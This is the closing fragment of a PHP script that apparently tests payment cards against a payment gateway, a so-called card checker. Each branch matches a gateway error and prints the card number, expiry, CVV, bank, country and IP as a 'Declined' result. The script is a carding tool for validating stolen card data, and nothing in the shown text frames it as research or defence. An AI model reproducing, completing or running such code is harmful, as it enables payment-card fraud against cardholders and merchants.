  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif 
(strpos($result2,  '-1')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='white'><font class='badge badge-light'>Update Nonce ❌</i></font> <br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font> <br>";
}

else {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card was Declined due to an Unknown Error ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;
//echo $result2;

?>
